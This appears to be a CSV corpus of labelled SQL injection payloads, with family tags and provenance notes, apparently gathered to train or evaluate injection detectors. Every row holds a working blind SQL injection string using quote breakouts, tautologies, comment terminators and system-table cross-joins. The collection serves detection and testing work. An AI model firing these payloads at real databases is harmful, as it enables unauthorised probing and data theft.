user_corpus_source_row,payload_as_provided,original_label,prior_filter_evidence,source_type,boolean_family_confirmed,behavior_confirmed,root_id,y_complexity,notes
5892,"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5912,"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'dphz'  =  'dphz",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5914,"-5959"" or 2477  =  1144",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5927,"1%""  )   and 9198  =  9198--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5930,"1%' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5936,"-4866""  )   as eyrq where 8365  =  8365 or 1898  =  8320#",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5938,"1'  )   as keom where 7524  =  7524 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5947,"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5952,1%'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  '%'  =  ',1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5954,-4617'   )    )     )   or 9323  =  9323#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5962,"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""uvvy"" like ""uvvy",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5967,"1"" and 9468  =  7105--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5980,"1 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5984,"1""   )    )     )   and 9198  =  9198--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6009,"1%""   )    )    and 1083  =  6202",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6013,1' where 9816  =  9816 and 7533  =  7533--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6034,"-5148""   )    )    or 5310  =  8229",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6036,1   )    )     )   and 9198  =  9198--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6043,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6049,"1%""   )    )    and 9198  =  9198--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6055,1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6056,-9191'  )   as qtvm where 2838  =  2838 or   (  8459  =  8459  )  *4906--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6074,"-4418"" or 6872  =  6872 and ""gbut""  =  ""gbut",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6083,"-9820"" or 1038  =  7502#",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6086,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6088,-5852  )   as anca where 3574  =  3574 or 3958  =  5536#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6090,"1%""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6101,1'+  (  select 'vidl' where 9445  =  9445 and 5498  =  5777#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6105,"-4072%""   )    )     )   or 3999  =  1979",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6115,-4339  )   where 7178  =  7178 or 4008  =  7232,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6120,"-4639""   )    )     )   or 8550  =  9348",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6128,1   )    )    and 9198  =  9198--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6132,"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6165,1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6176,1' where 6359  =  6359 and   (  3020  =  3020  )  *6703--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6185,1'  )   where 1369  =  1369 and 4840  =  1697#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6193,"1""  )   where 8953  =  8953 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6205,"-1203""   )    )    or 8571  =  8571--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6207,"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6232,1'   )    )    as dqdv where 8126  =  8126 and 4595  =  4595#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6233,"1%""  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6242,1'||  (  select 'hshf' where 9073  =  9073 and 7533  =  7533  )  ||',1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6244,"1' in boolean mode  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6245,-2165' where 6593  =  6593 or 9158  =  7254--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6252,"-6681""  )   or 5251  =  1162",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6254,"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6256,"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6262,"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykoz'  =  'ykoz",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6265,1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
6278,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
